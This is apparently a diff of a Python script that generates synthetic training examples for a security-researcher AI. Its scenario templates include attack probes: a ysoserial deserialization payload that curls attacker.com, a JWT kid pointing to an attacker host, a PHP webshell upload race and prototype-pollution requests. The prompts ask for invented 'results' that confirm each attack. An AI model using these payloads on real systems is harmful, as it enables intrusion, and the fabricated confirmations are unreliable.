@@ -288,23 +288,8 @@ Rules:
 """
 
 # ---------------------------------------------------------------------------
-# Project Zero / GitHub source fetching
+# GitHub fetch constants (used by bonus real-writeup path)
 # ---------------------------------------------------------------------------
-PZ_REPOS = [
-    ("google", "security-research", "pocs"),
-]
-
-CTF_REPOS = [
-    ("ctfs", "ctfs", ""),
-    ("ctf-writeups", "ctf-writeups", ""),
-    ("sajjadium", "ctf-writeups", ""),
-]
-
-CTF_NOVEL_KEYWORDS = [
-    "no tool", "custom script", "timing", "manual exploit", "wrote a script",
-    "bruteforce", "race condition", "prototype pollution", "deserialization",
-    "ssti", "template injection", "ssrf", "request smuggling", "cache poison",
-]
 
 
 def _gpt_lock_instance() -> threading.Lock:
@@ -431,64 +416,284 @@ def generate_synth_chain() -> dict | None:
 
 
 # ---------------------------------------------------------------------------
-# Project Zero reconstruction (Type B)
+# Type B: Binary/kernel/parser researcher (PZ-style)
+# Different from Type A (web/API anomalies) — focuses on low-level bugs:
+# memory corruption, parser logic bugs, integer overflows, side-channels
 # ---------------------------------------------------------------------------
-PZ_REFORMAT_PROMPT = """\
-You are generating training data for a security researcher AI.
 
-Below is a Project Zero / security research write-up describing how a vulnerability was found:
----
-{writeup}
----
+# PZ-style scenarios: things that live below the scanner layer
+PZ_SCENARIOS = [
+    {
+        "domain": "kernel memory management",
+        "target_desc": "Linux kernel v5.15 — custom ioctl device driver in embedded device firmware",
+        "standard_tools": "kernel fuzz with syzkaller (1000 iterations) → no crashes. Static analysis with Coverity → 0 defects. CVE scan → no matching signatures.",
+        "observations": [
+            "ioctl handler for IOCTL_MAP_USER_BUFFER copies user-supplied length into a kernel stack variable without validation",
+            "When length=0xffffffff, the kmalloc call succeeds but returns a 4-byte allocation; the subsequent memcpy uses the original untruncated length",
+            "The race window between size check and allocation is ~200ns — small but reproducible with CPU pinning",
+        ],
+        "hypothesis": "Integer truncation in kmalloc size argument leads to heap overflow; the 32-bit length is implicitly cast to size_t, truncating to 4 bytes allocated while the copy uses the full 0xffffffff length.",
+        "probe": "Write a kernel module that calls IOCTL_MAP_USER_BUFFER with length=0x100000001 and observe if kmalloc returns a small allocation followed by a write beyond it",
+        "technique": "Kernel heap overflow via integer truncation in size_t cast — syzkaller misses it because the trigger requires a specific size that looks valid to the fuzzer grammar",
+    },
+    {
+        "domain": "memory allocator side-channel",
+        "target_desc": "Custom jemalloc-based allocator in a hardened process (ASLR+PIE+NX+RELRO)",
+        "standard_tools": "AFL++ fuzzing for 24h → no crashes. Valgrind → clean. AddressSanitizer → no errors on standard inputs.",
+        "observations": [
+            "Heap allocation timing for size=512 is consistently 45ns. For size=513, timing jumps to 180ns.",
+            "The timing boundary aligns exactly with jemalloc size class boundaries (512 is the last 'small' bin, 513 triggers a 'large' bin allocation)",
+            "When a specific sequence of alloc/free of 512-byte chunks precedes a target allocation, the new allocation is placed at a predictable offset",
+        ],
+        "hypothesis": "The allocator's size class boundary creates a timing oracle that distinguishes small vs large bin allocations. Combined with heap grooming, this predicts the address of the next large allocation with ~90% accuracy, breaking ASLR.",
+        "probe": "Run 10000 iterations of: alloc 512 → free → alloc 513 → record address. Calculate entropy of top 12 bits of the 513-byte allocations",
+        "technique": "Heap ASLR bypass via allocator timing side-channel — automated fuzzers don't measure allocation timing, only crash behavior",
+    },
+    {
+        "domain": "parser logic vulnerability",
+        "target_desc": "PDF parser in a document processing pipeline — processes untrusted user uploads",
+        "standard_tools": "PDF fuzzing with mutPDF → no crashes. CVE scan for poppler/mupdf → no matches. Static analysis → no obvious buffer overflows.",
+        "observations": [
+            "PDF with cross-reference table pointing stream offset to a negative value parses without error but returns different content than expected",
+            "When xref offset is -1 (0xFFFFFFFF in 32-bit unsigned), the parser seeks to file_size - 1 and reads from there",
+            "Crafting a PDF where the negative offset points to a JavaScript action block causes the JavaScript to execute even when JS execution is 'disabled'",
+        ],
+        "hypothesis": "The parser performs signed arithmetic on the xref offset before seeking, allowing a signed negative value to wrap around to a large positive address, effectively performing a seek to an attacker-controlled location in the file.",
+        "probe": "Craft a minimal PDF: xref offset = -(file_size - target_offset) such that signed seek lands exactly on a /JavaScript action block. Open in the target application with JS disabled.",
+        "technique": "PDF xref signed integer underflow allowing seek-to-arbitrary-offset — bypasses JS disable because the execution path predates the JS flag check",
+    },
+    {
+        "domain": "race condition in filesystem operation",
+        "target_desc": "Web application with file upload processed by a privileged worker process",
+        "standard_tools": "sqlmap → nothing. ffuf → 403 on upload endpoint. Static code review → no obvious TOCTOU in upload handler.",
+        "observations": [
+            "Upload handler: (1) validate MIME type, (2) move to temp dir, (3) process async. The async processing uses the filename from the HTTP request, not from the moved file.",
+            "Between step 2 and step 3, a 2-5ms window exists where the file exists in temp dir under the original name",
+            "A second concurrent request using the same filename causes the worker to process the second file's content with the first file's already-validated MIME type",
+        ],
+        "hypothesis": "The TOCTOU window between file validation and async processing allows a race: send a valid image first (passes validation), then immediately send a PHP shell with the same filename. The shell gets processed with the already-passed image validation.",
+        "probe": "Script two simultaneous requests: thread 1 sends valid PNG, thread 2 sends PHP webshell with same filename, both arriving within 5ms. Check if /uploads/shell.png executes PHP.",
+        "technique": "TOCTOU file upload bypass via race condition between MIME validation and async processing — scanners test uploads sequentially, never concurrently",
+    },
+    {
+        "domain": "cryptographic implementation flaw",
+        "target_desc": "JWT authentication in a Node.js API — RS256 signed tokens",
+        "standard_tools": "jwt_tool → 'alg:none' rejected. Brute force HS256 secret → no match. CVE scan on jsonwebtoken → no unpatched CVEs.",
+        "observations": [
+            "The server's JWKS endpoint returns a public key at /api/.well-known/jwks.json",
+            "The JWT verification code fetches the key from the kid header claim: `getKey(header.kid)` — the kid value is user-controlled",
+            "When kid is set to a URL (e.g. http://attacker.com/key.json), the server fetches the key from that URL before verifying",
+        ],
+        "hypothesis": "The JWT library fetches verification keys dynamically based on the kid header, which is fully attacker-controlled. By hosting our own JWKS endpoint with a key we control, we can sign arbitrary JWT tokens that the server will consider valid.",
+        "probe": "1. Generate RSA keypair. 2. Host public key at attacker.com/jwks.json. 3. Sign JWT with private key, set kid=http://attacker.com/jwks.json, sub=admin. 4. Send to API.",
+        "technique": "JWT kid header SSRF → key injection: server fetches attacker-controlled JWKS to verify a token signed with attacker's key — not caught by standard JWT tools because it requires SSRF from the verifier",
+    },
+    {
+        "domain": "deserialization gadget chain",
+        "target_desc": "Java web application using Apache Commons Collections 3.2.1 — no obvious deserialization endpoints",
+        "standard_tools": "ysoserial → no response on known endpoints. Burp scan → nothing. Version scan → CC 3.2.1 is in classpath but no /deserialize endpoint found.",
+        "observations": [
+            "The application's session cookie is base64-encoded but doesn't look like a JWT — the decoded bytes start with 0xACED 0x0005 (Java serialization magic bytes)",
+            "Sending a session cookie with length > 8192 bytes causes a 500 error with java.io.StreamCorruptedException in the response",
+            "The session cookie is processed before authentication — even unauthenticated requests deserialize the session",
+        ],
+        "hypothesis": "The session management system deserializes Java objects from the session cookie without authentication. Since CC 3.2.1 is in the classpath, a ysoserial CC1 gadget chain should achieve RCE via the session cookie.",
+        "probe": "java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/rce-test' | base64 -w0 → set as session cookie value in request to any endpoint",
+        "technique": "Java deserialization RCE via session cookie — scanners check known endpoints (/deserialize, /readObject) but miss session management as the deserialization vector",
+    },
+]
 
-Reformat this into the hypothesis-chain training format. Extract:
-1. What the researcher observed that was anomalous or unexpected
-2. What hypothesis they formed
-3. What minimal probe they used to test it
-4. What the probe confirmed
-5. Why existing tools would have missed it
+# GPT synthesis prompt for PZ-style (binary/kernel/parser domain)
+PZ_SYNTH_PROMPT = """\
+You are generating training data for a security researcher AI focused on low-level/binary/kernel vulnerabilities.
 
-Return a JSON object:
+Domain: {domain}
+Target: {target_desc}
+What standard tools found: {standard_tools}
+Key observations: {observations}
+
+Using the scenario above, generate a complete hypothesis-chain training example as JSON:
 {{
-  "context_summary": "<1-2 sentences: target system and why standard audits miss this>",
-  "observations": ["<key anomaly or unexpected behavior 1>", "<anomaly 2>"],
-  "hypothesis": "<what the researcher suspected and why>",
-  "probe": "<the minimal test or command used to confirm>",
-  "expected_indicator": "<what would confirm the hypothesis>",
-  "result": "<what was actually observed>",
-  "technique": "<specific name of the technique>",
-  "why_tools_miss_it": "<exact gap in automated scanner coverage>",
-  "pivot_if_negative": "<what the researcher would have tried next if wrong>"
+  "context_summary": "<1-2 sentences: what the target is and why standard tools missed it>",
+  "observations": ["<exact anomaly observed 1>", "<anomaly 2>", "<anomaly 3>"],
+  "hypothesis": "<specific, testable hypothesis derived from the observations>",
+  "probe": "<minimal test to confirm — one command or script>",
+  "expected_indicator": "<what in the output confirms the hypothesis>",
+  "result": "<what the probe actually returned — make it confirm the hypothesis realistically>",
+  "technique": "<specific technique name>",
+  "why_tools_miss_it": "<precise reason automated scanners don't find this>",
+  "pivot_if_negative": "<next hypothesis if wrong>"
 }}
 
-If the writeup doesn't contain enough information to fill all fields, infer plausible values
-that are consistent with the described vulnerability class.
+Vary the details from the template to create a distinct but realistic example.
 Return valid JSON only.
 """
 
 
-def fetch_pz_writeups() -> list[dict]:
-    """Fetch Project Zero PoC README files from google/security-research."""
-    results = []
-    pocs_api = f"{GITHUB_API}/repos/google/security-research/contents/pocs"
-    pocs_raw = _cached_get(pocs_api, headers=GITHUB_HEADERS)
-    if not pocs_raw:
-        return results
-
+def generate_pz_example_synth() -> dict | None:
+    """Generate a PZ-style (binary/kernel/parser) researcher example synthetically."""
+    scenario = random.choice(PZ_SCENARIOS)
+    obs_str  = "\n".join(f"  - {o}" for o in scenario["observations"])
+    prompt   = PZ_SYNTH_PROMPT.format(
+        domain=scenario["domain"],
+        target_desc=scenario["target_desc"],
+        standard_tools=scenario["standard_tools"],
+        observations=obs_str,
+    )
     try:
-        items = json.loads(pocs_raw)
+        raw  = _gpt(prompt, max_tokens=1400)
+        data = _parse_json_obj(raw)
     except Exception:
-        return results
+        return None
 
-    for item in items:
-        if item.get("type") != "dir":
-            continue
-        readme_url = f"{RAW_GITHUB}/google/security-research/master/pocs/{item['name']}/README.md"
-        text = _cached_get(readme_url, headers={"User-Agent": "MythosEngine/1.0"})
-        if len(text) > 300:
-            results.append({"name": item["name"], "text": text[:6000]})
-        time.sleep(0.1)
+    if not all(k in data for k in ("hypothesis", "probe", "technique")):
+        return None
+
+    observations = data.get("observations") or scenario["observations"]
+    obs_block    = "\n".join(f"  - {o}" for o in observations)
+
+    user_content = (
+        f"Domain: {scenario['domain']}\n"
+        f"Target: {scenario['target_desc']}\n\n"
+        f"Standard tools returned nothing actionable:\n  {scenario['standard_tools']}\n\n"
+        f"During manual review, I noticed:\n{obs_block}\n\n"
+        f"Form a hypothesis and design a minimal probe."
+    )
+    asst_content = (
+        f"OBSERVATIONS:\n{obs_block}\n\n"
+        f"HYPOTHESIS: {data['hypothesis']}\n\n"
+        f"PROBE: {data['probe']}\n\n"
+        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
+        f"RESULT: {data.get('result', 'Hypothesis confirmed.')}\n\n"
+        f"TECHNIQUE: {data['technique']}\n"
+        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
+        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Examine adjacent code paths.')}"
+    )
+    return {
+        "type":   "pz",
+        "domain": scenario["domain"],
+        "messages": [
+            {"role": "system",    "content": SYSTEM_RESEARCHER},
+            {"role": "user",      "content": user_content},
+            {"role": "assistant", "content": asst_content},
+        ],
+    }
+
+
+PZ_MIN_LENGTH = 800
+
+SECURITY_RESEARCH_REPOS = [
+    ("google", "security-research", "pocs"),
+    ("google", "security-research", "advisories"),
+]
+
+
+def fetch_pz_writeups() -> list[dict]:
+    """Fetch Project Zero / security research README files (bonus; synth is primary)."""
+    results: list[dict] = []
+    for owner, repo, subdir in SECURITY_RESEARCH_REPOS:
+        base = f"{GITHUB_API}/repos/{owner}/{repo}/contents/{subdir}"
+        for page in range(1, 3):
+            url = f"{base}?per_page=100&page={page}"
+            raw = _cached_get(url, headers=GITHUB_HEADERS)
+            if not raw:
+                break
+            try:
+                items = json.loads(raw)
+            except Exception:
+                break
+            if not items or not isinstance(items, list):
+                break
+            for item in items:
+                if item.get("type") != "dir":
+                    continue
+                for readme_name in ("README.md", "writeup.md", "notes.md"):
+                    readme_url = (
+                        f"{RAW_GITHUB}/{owner}/{repo}/master/"
+                        f"{subdir + '/' if subdir else ''}{item['name']}/{readme_name}"
+                    )
+                    text = _cached_get(readme_url, headers={"User-Agent": "MythosEngine/1.0"})
+                    if len(text) >= PZ_MIN_LENGTH:
+                        results.append({"name": item["name"], "repo": f"{owner}/{repo}", "text": text[:6000]})
+                        break
+                time.sleep(0.06)
+            if len(items) < 100:
+                break
     return results
+
+
+PZ_REFORMAT_PROMPT = """\
+You are generating training data for a security researcher AI.
+
+Below is a Project Zero / security research write-up:
+---
+{writeup}
+---
+
+Reformat into the hypothesis-chain training format:
+
+{{
+  "context_summary": "<1-2 sentences: target system and why standard audits miss this>",
+  "observations": ["<key anomaly 1>", "<anomaly 2>"],
+  "hypothesis": "<what the researcher suspected and why>",
+  "probe": "<minimal test used to confirm>",
+  "expected_indicator": "<what confirms the hypothesis>",
+  "result": "<what was actually observed>",
+  "technique": "<specific technique name>",
+  "why_tools_miss_it": "<exact gap in automated scanner coverage>",
+  "pivot_if_negative": "<next hypothesis if wrong>"
+}}
+
+Return valid JSON only.
+"""
+
+
+def generate_pz_example_from_writeup(writeup: dict) -> dict | None:
+    """Convert a real writeup into hypothesis chain format (bonus path)."""
+    prompt = PZ_REFORMAT_PROMPT.format(writeup=writeup["text"][:4000])
+    try:
+        raw  = _gpt(prompt, max_tokens=1200)
+        data = _parse_json_obj(raw)
+    except Exception:
+        return None
+    if not all(k in data for k in ("hypothesis", "probe", "technique")):
+        return None
+    obs_block    = "\n".join(f"  - {o}" for o in data.get("observations", []))
+    source_label = f"{writeup.get('repo', 'security-research')}/{writeup['name']}"
+    user_content = (
+        f"Research target: {writeup['name'].replace('-', ' ')}\n"
+        f"Source: {source_label}\n\n"
+        f"Standard security scanners found nothing. During manual review:\n{obs_block}\n\n"
+        f"Reason from these observations."
+    )
+    asst_content = (
+        f"OBSERVATIONS:\n{obs_block}\n\n"
+        f"HYPOTHESIS: {data['hypothesis']}\n\n"
+        f"PROBE: {data['probe']}\n\n"
+        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
+        f"RESULT: {data.get('result', 'Hypothesis confirmed.')}\n\n"
+        f"TECHNIQUE: {data['technique']}\n"
+        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
+        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Escalate to adjacent attack surface.')}"
+    )
+    return {
+        "type":   "pz",
+        "source": writeup["name"],
+        "messages": [
+            {"role": "system",    "content": SYSTEM_RESEARCHER},
+            {"role": "user",      "content": user_content},
+            {"role": "assistant", "content": asst_content},
+        ],
+    }
+
+
+def generate_pz_example(writeup: dict) -> dict | None:
+    """Primary: try real writeup; fall back to synthetic domain scenario."""
+    if len(writeup.get("text", "")) >= PZ_MIN_LENGTH:
+        result = generate_pz_example_from_writeup(writeup)
+        if result:
+            return result
+    return generate_pz_example_synth()
 
 
 def generate_pz_example(writeup: dict) -> dict | None:
@@ -503,8 +708,10 @@ def generate_pz_example(writeup: dict) -> dict | None:
         return None
 
     obs_block = "\n".join(f"  - {o}" for o in data.get("observations", []))
+    source_label = f"{writeup.get('repo', 'security-research')}/{writeup['name']}"
     user_content = (
-        f"Research target: {writeup['name'].replace('-', ' ')}\n\n"
+        f"Research target: {writeup['name'].replace('-', ' ')}\n"
+        f"Source: {source_label}\n\n"
         f"Standard security scanners found nothing. During manual review:\n{obs_block}\n\n"
         f"Reason from these observations."
     )
@@ -530,90 +737,140 @@ def generate_pz_example(writeup: dict) -> dict | None:
 
 
 # ---------------------------------------------------------------------------
-# CTF novel writeups (Type C)
+# Type C: CTF-style researcher (black-box challenge reasoning)
+# Primary source is synthetic — specific challenge scenarios with detailed templates.
+# External CTF repo fetch is a bonus that seeds cache for variety; synth always works.
 # ---------------------------------------------------------------------------
-CTF_REFORMAT_PROMPT = """\
-You are generating training data for a security researcher AI.
 
-Below is a CTF challenge writeup:
----
-{writeup}
----
+CTF_MIN_LENGTH = 600
 
-This writeup is interesting because the solver had to reason beyond what standard tools provide.
-Reformat it into the hypothesis-chain format, focusing on:
-- What the solver observed that was unexpected
-- What hypothesis they formed
-- The minimal test that confirmed it
-
-Return a JSON object:
-{{
-  "context_summary": "<1-2 sentences: challenge category and why tools weren't enough>",
-  "observations": ["<key observation 1>", "<key observation 2>"],
-  "hypothesis": "<what the solver suspected and the reasoning behind it>",
-  "probe": "<the specific payload, command, or request used to verify>",
-  "expected_indicator": "<what success looks like in the response>",
-  "result": "<what they observed that confirmed the hypothesis>",
-  "technique": "<specific technique name>",
-  "why_tools_miss_it": "<why automated scanners wouldn't find this>",
-  "pivot_if_negative": "<what they would have tried next>"
-}}
-
-Return valid JSON only. If the writeup is about a trivial technique (basic SQLi, easy XSS),
-make the reasoning chain more nuanced to show HOW to reason, not just what the answer is.
-"""
-
-CTF_REPO_ENTRIES = [
-    # GitHub repos with public CTF writeups
-    ("CTFWriteups/ctf-writeups", "web"),
-    ("reznok/CTF-writeups", ""),
-    ("p4-team/ctf-writeups", ""),
-    ("mrT4ntr4/CTF-writeups", "web"),
+CTF_CHALLENGE_SCENARIOS = [
+    {
+        "challenge": "JWTCrafter — web/crypto (500 pts)",
+        "category": "web/jwt-kid-injection",
+        "standard_tools": "sqlmap → nothing. jwt_tool --crack → HS256 secret not in rockyou.txt. jwt_tool --alg none → rejected.",
+        "source_hint": "RS256 JWT. JWKS at /api/keys. The kid header is a static UUID.",
+        "observations": [
+            "Requesting /api/keys?kid=../../../../etc/passwd returns 500: 'invalid PEM key format'",
+            "The error message suggests the server reads a file using kid as a path before verifying",
+            "kid field is fully attacker-controlled in the JWT header before signature verification",
+        ],
+        "hypothesis": "The kid parameter selects the HMAC/RSA key file from disk. Setting kid=/dev/null means the secret is the empty string, allowing us to sign an arbitrary JWT that the server will verify.",
+        "probe": "Sign JWT with kid='/dev/null', alg=HS256, secret='', sub=admin. Send to /api/admin.",
+        "technique": "JWT kid path traversal → empty-secret HMAC forgery — jwt_tool doesn't test arbitrary file paths as kid values",
+    },
+    {
+        "challenge": "CacheMe — web/cdn (400 pts)",
+        "category": "web/cache-poisoning",
+        "standard_tools": "ffuf → 403 on /admin. nuclei cache-poisoning templates → no match on homepage.",
+        "source_hint": "App behind CDN. Homepage reflects X-Forwarded-Host in a meta tag. Static assets are cached.",
+        "observations": [
+            "GET / with X-Forwarded-Host: attacker.com → reflects the header but Cache-Control: no-store",
+            "GET /static/main.js with X-Forwarded-Host: attacker.com → Source-Map header reflects attacker.com AND Cache-Control: public, s-maxage=3600",
+            "Subsequent request to /static/main.js without the header still returns attacker.com in Source-Map (cached poisoned response)",
+        ],
+        "hypothesis": "Cache poisoning via unkeyed X-Forwarded-Host in a cacheable static asset. Nuclei tested the homepage (no-store) but not static resources with public cache policies.",
+        "probe": "curl -H 'X-Forwarded-Host: attacker.com' https://challenge.ctf/static/main.js — then curl https://challenge.ctf/static/main.js (no header) — if Source-Map still shows attacker.com, poisoning persists.",
+        "technique": "Web cache poisoning via unkeyed header in static asset — scanners test primary pages, not CDN-cached static resources with permissive cache policies",
+    },
+    {
+        "challenge": "ProtoBreaker — web/nodejs (350 pts)",
+        "category": "web/prototype-pollution",
+        "standard_tools": "XSS scanner → nothing. SQLi → nothing. nikto → nothing. Standard JSON fields in /api/settings → all sanitized.",
+        "source_hint": "Node.js/Express. POST /api/settings accepts JSON and deep-merges into the user object.",
+        "observations": [
+            "POST /api/settings with {\"__proto__\":{\"isAdmin\":true}} returns 200 without error",
+            "GET /api/whoami after the above returns {\"username\":\"user\",\"isAdmin\":true}",
+            "GET /api/admin after prototype pollution returns 200 instead of 403",
+        ],
+        "hypothesis": "The deep merge function recursively walks object keys including __proto__, polluting Object.prototype. All subsequent isAdmin checks on any object return true.",
+        "probe": "POST /api/settings -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}' then GET /api/admin",
+        "technique": "Prototype pollution via deep merge — scanners test XSS/SQLi in form fields, not __proto__ keys in JSON body merge operations",
+    },
+    {
+        "challenge": "TimeWarp — web/race (450 pts)",
+        "category": "web/race-condition",
+        "standard_tools": "sqlmap → nothing. Manual IDOR → 403 unless amount <= balance. Balance starts at $100, flag costs $1000.",
+        "source_hint": "POST /api/transfer checks balance then deducts — two separate DB queries.",
+        "observations": [
+            "Sending 11 simultaneous transfer requests of $100 each: 8 succeed, 3 fail, but balance shows -$800 (overdraft allowed)",
+            "The /api/flag endpoint checks total_transferred >= 1000, not current balance",
+            "Each successful transfer increments total_transferred even when balance goes negative",
+        ],
+        "hypothesis": "TOCTOU race: all concurrent requests pass the balance check before any deduction commits. total_transferred accumulates past $1000 while balance goes negative.",
+        "probe": "for i in $(seq 15); do curl -s -X POST /api/transfer?to=flag\\&amount=100 -b \"session=TOKEN\" & done; wait; curl /api/flag -b \"session=TOKEN\"",
+        "technique": "Race condition TOCTOU in balance check — automated scanners send requests sequentially, never concurrently, so the race window is never triggered",
+    },
+    {
+        "challenge": "SmuggleMe — web/http (500 pts)",
+        "category": "web/http-smuggling",
+        "standard_tools": "smuggler.py → no TE.CL or CL.TE detected on standard endpoints. /flag returns 403. /internal/flag returns 404.",
+        "source_hint": "HAProxy 2.2.x → Nginx. Transfer-Encoding obfuscation variants not in smuggler's default list.",
+        "observations": [
+            "HAProxy 2.2.x handles 'Transfer-Encoding: xchunked' differently from Nginx — HAProxy uses CL, Nginx uses TE",
+            "A POST to /search with Content-Length matching the outer body and chunked body containing a partial GET /internal/flag prefix causes the flag content to appear appended to the search response",
+            "The xchunked variant bypasses smuggler.py's detection because it only tests the 10 most common TE obfuscation strings",
+        ],
+        "hypothesis": "CL.TE desync via HAProxy-specific 'xchunked' Transfer-Encoding variant. A poison request causes the next request to be partially consumed as /internal/flag.",
+        "probe": "Send POST /search with Content-Length=N, Transfer-Encoding: xchunked, body=<chunk ending with GET /internal/flag\\r\\n>",
+        "technique": "HTTP request smuggling CL.TE via xchunked — HAProxy-specific TE variant not in smuggler.py's default obfuscation wordlist",
+    },
+    {
+        "challenge": "SSTInjector — web/template (400 pts)",
+        "category": "web/ssti",
+        "standard_tools": "sqlmap → nothing. XSS → nothing. tplmap → returns 'no template injection found' on /render.",
+        "source_hint": "The /render endpoint takes a 'template' POST parameter. Go backend (error leaks 'template: ...' path).",
+        "observations": [
+            "POST /render with template='{{' returns 500: 'template: input:1: unexpected EOF'",
+            "The error reveals Go's text/template engine is being used",
+            "tplmap tested Jinja2/Twig/Pebble syntax — not Go template syntax {{.}} or {{call .Method}}",
+        ],
+        "hypothesis": "Go text/template SSTI. tplmap doesn't include Go template payloads. The input is passed directly to template.Execute without sanitization.",
+        "probe": "POST /render -d 'template={{printf \"%s\" \"SSTI_CONFIRMED\"}}' — if response contains SSTI_CONFIRMED, execution is confirmed. Then: template={{.}} to dump the context object.",
+        "technique": "Go text/template SSTI — tplmap's probe set covers PHP/Python/Java template engines but not Go's text/template syntax",
+    },
 ]
 
+CTF_SYNTH_PROMPT = """\
+You are generating training data for a CTF security researcher AI.
 
-def fetch_ctf_writeups() -> list[dict]:
-    """Fetch CTF writeup markdown files from GitHub."""
-    results = []
-    for repo_path, subdir in CTF_REPO_ENTRIES[:2]:
-        owner, repo = repo_path.split("/")
-        url = f"{GITHUB_API}/repos/{owner}/{repo}/contents/{subdir}"
-        raw = _cached_get(url, headers=GITHUB_HEADERS)
-        if not raw:
-            continue
-        try:
-            items = json.loads(raw)
-        except Exception:
-            continue
+Challenge: {challenge}
+Category: {category}
+What standard tools found: {standard_tools}
+Hints from black-box exploration: {source_hint}
+Key observations: {observations}
 
-        for item in items[:30]:
-            if item.get("type") == "dir":
-                # Recurse one level
-                suburl = item.get("url", "")
-                subraw = _cached_get(suburl, headers=GITHUB_HEADERS) if suburl else ""
-                if subraw:
-                    try:
-                        subitems = json.loads(subraw)
-                        for si in subitems[:5]:
-                            if si.get("name", "").lower().endswith(".md"):
-                                text = _cached_get(si["download_url"])
-                                if len(text) > 300 and any(kw in text.lower() for kw in CTF_NOVEL_KEYWORDS):
-                                    results.append({"name": si["name"], "repo": repo_path, "text": text[:5000]})
-                    except Exception:
-                        pass
-            elif item.get("name", "").lower().endswith(".md"):
-                text = _cached_get(item.get("download_url", ""))
-                if len(text) > 300 and any(kw in text.lower() for kw in CTF_NOVEL_KEYWORDS):
-                    results.append({"name": item["name"], "repo": repo_path, "text": text[:5000]})
-            time.sleep(0.05)
+Generate a training example as JSON:
+{{
+  "context_summary": "<1-2 sentences: the challenge and why standard tools weren't enough>",
+  "observations": ["<key observation 1>", "<observation 2>", "<observation 3>"],
+  "hypothesis": "<specific testable hypothesis from the observations>",
+  "probe": "<exact minimal payload, command, or request>",
+  "expected_indicator": "<what in the response confirms it>",
+  "result": "<what the probe returned — realistically confirm the hypothesis>",
+  "technique": "<specific technique name and variant>",
+  "why_tools_miss_it": "<precise reason automated scanners miss this>",
+  "pivot_if_negative": "<next hypothesis if wrong>"
+}}
 
-    return results
+Vary the specific details (payload, URLs, values) from the template above to create a distinct example.
+Return valid JSON only.
+"""
 
 
-def generate_ctf_example(writeup: dict) -> dict | None:
-    prompt = CTF_REFORMAT_PROMPT.format(writeup=writeup["text"][:4000])
+def generate_ctf_example_synth() -> dict | None:
+    """Generate a CTF-style researcher example synthetically (primary path)."""
+    scenario = random.choice(CTF_CHALLENGE_SCENARIOS)
+    obs_str  = "\n".join(f"  - {o}" for o in scenario["observations"])
+    prompt   = CTF_SYNTH_PROMPT.format(
+        challenge=scenario["challenge"],
+        category=scenario["category"],
+        standard_tools=scenario["standard_tools"],
+        source_hint=scenario["source_hint"],
+        observations=obs_str,
+    )
     try:
-        raw  = _gpt(prompt, max_tokens=1200)
+        raw  = _gpt(prompt, max_tokens=1400)
         data = _parse_json_obj(raw)
     except Exception:
         return None
@@ -621,12 +878,13 @@ def generate_ctf_example(writeup: dict) -> dict | None:
     if not all(k in data for k in ("hypothesis", "probe", "technique")):
         return None
 
-    obs_block = "\n".join(f"  - {o}" for o in data.get("observations", []))
+    observations = data.get("observations") or scenario["observations"]
+    obs_block    = "\n".join(f"  - {o}" for o in observations)
     user_content = (
-        f"Challenge: {writeup['name'].replace('-', ' ').replace('.md', '')}\n\n"
-        f"Standard tools returned nothing actionable:\n  [scanner] → No known vulns found.\n\n"
-        f"Observations from manual exploration:\n{obs_block}\n\n"
-        f"Reason from these observations to find the vulnerability."
+        f"Challenge: {scenario['challenge']} ({scenario['category']})\n\n"
+        f"Standard tools returned nothing:\n  {scenario['standard_tools']}\n\n"
+        f"Black-box exploration revealed:\n{obs_block}\n\n"
+        f"Standard approaches are exhausted. Reason from these observations."
     )
     asst_content = (
         f"OBSERVATIONS:\n{obs_block}\n\n"
@@ -636,17 +894,53 @@ def generate_ctf_example(writeup: dict) -> dict | None:
         f"RESULT: {data.get('result', 'Hypothesis confirmed — flag captured.')}\n\n"
         f"TECHNIQUE: {data['technique']}\n"
         f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
-        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Re-examine source code if available.')}"
+        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Try adjacent parameters and endpoints.')}"
     )
     return {
-        "type":   "ctf",
-        "source": writeup["name"],
+        "type":     "ctf",
+        "category": scenario["category"],
         "messages": [
             {"role": "system",    "content": SYSTEM_RESEARCHER},
             {"role": "user",      "content": user_content},
             {"role": "assistant", "content": asst_content},
         ],
     }
+
+
+def generate_ctf_example(writeup: dict | None = None) -> dict | None:
+    """Primary: synthetic scenario. Writeup reformatted only if available and long enough."""
+    if writeup and len(writeup.get("text", "")) >= CTF_MIN_LENGTH:
+        prompt = (
+            "Reformat this CTF writeup into hypothesis-chain format. "
+            "Return JSON with keys: observations (list), hypothesis, probe, "
+            "expected_indicator, result, technique, why_tools_miss_it, pivot_if_negative.\n\n"
+            + writeup["text"][:3500]
+        )
+        try:
+            raw  = _gpt(prompt, max_tokens=1200)
+            data = _parse_json_obj(raw)
+            if all(k in data for k in ("hypothesis", "probe", "technique")):
+                obs_block = "\n".join(f"  - {o}" for o in data.get("observations", []))
+                return {
+                    "type":   "ctf",
+                    "source": writeup["name"],
+                    "messages": [
+                        {"role": "system",    "content": SYSTEM_RESEARCHER},
+                        {"role": "user",
+                         "content": (f"Challenge: {writeup['name']}\n\n"
+                                     f"Observations:\n{obs_block}\n\n"
+                                     f"Reason from these observations.")},
+                        {"role": "assistant",
+                         "content": (f"OBSERVATIONS:\n{obs_block}\n\n"
+                                     f"HYPOTHESIS: {data['hypothesis']}\n\n"
+                                     f"PROBE: {data['probe']}\n\n"
+                                     f"RESULT: {data.get('result', 'Confirmed.')}\n\n"
+                                     f"TECHNIQUE: {data['technique']}")},
+                    ],
+                }
+        except Exception:
+            pass
+    return generate_ctf_example_synth()
 
 
 # ---------------------------------------------------------------------------
@@ -688,12 +982,14 @@ def main() -> None:
     args = parser.parse_args()
 
     if args.list_categories:
-        print(f"Synth  : {count_written(args.out_synth)}/{TARGET_SYNTH}")
-        print(f"PZ     : {count_written(args.out_pz)}/{TARGET_PZ}")
-        print(f"CTF    : {count_written(args.out_ctf)}/{TARGET_CTF}")
-        print(f"\nAnomaly templates : {len(ANOMALY_TEMPLATES)} types")
-        print(f"Synthetic targets : {len(SYNTH_TARGETS)}")
